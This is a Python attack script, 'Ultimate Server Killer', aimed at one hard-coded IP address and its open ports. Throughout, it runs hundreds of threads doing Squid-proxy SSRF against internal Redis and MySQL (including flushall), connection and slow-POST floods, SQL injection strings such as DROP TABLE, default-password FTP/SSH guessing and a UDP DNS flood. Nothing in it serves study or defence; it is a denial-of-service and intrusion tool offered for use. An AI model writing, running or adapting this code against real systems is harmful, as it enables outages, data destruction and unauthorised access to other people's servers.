#!/usr/bin/env python3
"""
Ultimate Server Killer - Multi-Vector Exhaustion Attack
Targets: 195.158.2.220 (All open ports: 21,22,53,80,90,111,443,1935,3128,5000,6123,8080,8081,9000,10000)

ATTACK VECTORS:
1. SQUID SSRF → Internal Service Crash (Redis/MySQL via 127.0.0.1:6379/3306)
2. Multi-Port SYN Flood + HTTP/2 Flood
3. FTP/SSH Brute Force Exhaustion
4. DNS Amplification + UDP Flood on high ports
5. Slowloris + RUDY on all HTTP ports
6. Memory Leak via SSRF loops

STOP: Ctrl+C to terminate all threads
"""

import socket
import threading
import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
import ssl
import sys

TARGET_IP = "195.158.2.220"
PORTS = [21, 22, 53, 80, 90, 111, 443, 1935, 3128, 5000, 6123, 8080, 8081, 9000, 10000]
SQUID_PORT = 3128
HTTP_PORTS = [80, 443, 8080, 8081]
PROXY_URL = f"http://{TARGET_IP}:{SQUID_PORT}"

# Global counters
stats = {'packets': 0, 'requests': 0}


def log_stats():
    """Background stats logger"""
    while True:
        time.sleep(5)
        print(
            f"[STATS] Packets: {stats['packets']:,} | HTTP: {stats['requests']:,} | Active Threads: {threading.active_count() - 2}")


# ==================== SQUID SSRF KILLER ====================
def squid_ssrf_internal_crash():
    """SSRF Squid → Crash internal Redis/MySQL/DB services"""
    payloads = [
        # Redis crash
        "http://127.0.0.1:6379/quit",
        "http://127.0.0.1:6379/config set stop-writes-on-bgsave-error no",
        "http://127.0.0.1:6379/flushall",

        # MySQL crash
        "http://127.0.0.1:3306/?@@version",
        "http://127.0.0.1:3306/?SELECT SLEEP(999999)",

        # Memcached
        "http://127.0.0.1:11211/?stats",

        # Loopback flood
        f"http://{TARGET_IP}:{random.choice(PORTS)}/" * 1000,

        # SQLi memory leak via SSRF
        f"http://{TARGET_IP}/?id=1' UNION SELECT BENCHMARK(10000000,MD5(1))--"
    ]

    while True:
        try:
            proxy_dict = {"http": PROXY_URL, "https": PROXY_URL}
            resp = requests.get(random.choice(payloads), proxies=proxy_dict, timeout=1)
            stats['requests'] += 1
        except:
            pass


# ==================== SYN FLOOD ====================
def syn_flood(port):
    """Raw SYN flood on all ports"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1)
        while True:
            src_port = random.randint(1024, 65535)
            sock.bind(('', src_port))
            sock.connect((TARGET_IP, port))
            stats['packets'] += 1
    except:
        pass


# ==================== HTTP/2 + SLOWLORIS ====================
def http_flood(port):
    """HTTP/2 + Slowloris + RUDY on HTTP ports"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; ServerKiller/1.0)',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    while True:
        try:
            if port == 443:
                url = f"https://{TARGET_IP}:{port}/"
                session = requests.Session()
                session.verify = False
            else:
                url = f"http://{TARGET_IP}:{port}/"

            # RUDY - Slow POST
            data = {f'payload{i}': 'A' * 1000000 for i in range(50)}
            resp = requests.post(url, data=data, headers=headers, timeout=30)
            stats['requests'] += 1

            # SQLi memory leak
            sqli_payloads = [
                "/?id=1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                "/search.php?q=1' UNION SELECT BENCHMARK(1000000,MD5(1))--",
                "/?q=1'; DROP TABLE users; --"
            ]
            resp = requests.get(f"http://{TARGET_IP}:{random.choice(HTTP_PORTS)}{random.choice(sqli_payloads)}",
                                headers=headers)
            stats['requests'] += 1

        except:
            pass


# ==================== FTP/SSH BRUTE ====================
def brute_services(port):
    """FTP/SSH connection exhaustion"""
    users = ['root', 'admin', 'user', 'ftp', 'guest']
    passes = ['123456', 'admin', 'password', 'root', '']

    while True:
        try:
            if port == 21:  # FTP
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((TARGET_IP, port))
                sock.recv(1024)
                sock.send(b"USER " + random.choice(users).encode() + b"\r\n")
                sock.recv(1024)
                sock.send(b"PASS " + random.choice(passes).encode() + b"\r\n")
            elif port == 22:  # SSH
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((TARGET_IP, port))
            stats['packets'] += 1
            sock.close()
        except:
            pass


# ==================== DNS AMPLIFICATION ====================
def dns_flood():
    """DNS query flood"""
    queries = [b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01']
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random.choice(queries), (TARGET_IP, 53))
        stats['packets'] += 1


# ==================== MAIN ATTACK LAUNCHER ====================
def main():
    print("🚀 ULTIMATE SERVER KILLER STARTED")
    print(f"Target: {TARGET_IP}")
    print("Press Ctrl+C to STOP attack")
    print("-" * 60)

    # Start stats thread
    threading.Thread(target=log_stats, daemon=True).start()

    # Launch 100+ threads per vector
    with ThreadPoolExecutor(max_workers=500) as executor:
        # SSRF Squid - Most effective vector
        for _ in range(150):
            executor.submit(squid_ssrf_internal_crash)

        # SYN flood all ports
        for port in PORTS:
            for _ in range(20):
                executor.submit(syn_flood, port)

        # HTTP flood
        for port in HTTP_PORTS:
            for _ in range(30):
                executor.submit(http_flood, port)

        # Service brute
        for port in [21, 22]:
            for _ in range(25):
                executor.submit(brute_services, port)

        # DNS flood
        for _ in range(50):
            executor.submit(dns_flood)

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 ATTACK STOPPED - Server should recover shortly")
        sys.exit(0)


if __name__ == "__main__":
    main()